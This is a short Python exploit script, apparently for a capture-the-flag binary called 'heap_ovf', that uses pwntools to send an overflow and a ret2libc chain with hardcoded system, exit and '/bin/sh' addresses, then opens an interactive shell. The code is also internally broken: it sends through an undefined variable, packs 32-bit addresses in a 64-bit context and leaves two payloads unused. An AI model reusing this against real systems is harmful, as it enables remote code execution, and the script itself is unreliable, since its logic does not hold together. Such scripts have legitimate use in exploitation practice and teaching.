#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    atk = process('./heap_ovf')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    chall = ELF('./heap_ovf', checksec=True)
else:
    atk = remote('localhost', 1335)
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    chall = None

# Payloads
payload = b"A" * 32 + p64(0x403360)
payload2 = p64(0x4011b6)

offset = b'A' * 72
payload_system = p32(0xf7dd38e0)
payload_exit = p32(0xf7dc25b0)
payload_sh = p32(0xf7f40de8)
p.sendline(offset + payload_system + payload_exit + payload_sh)
p.interactive()
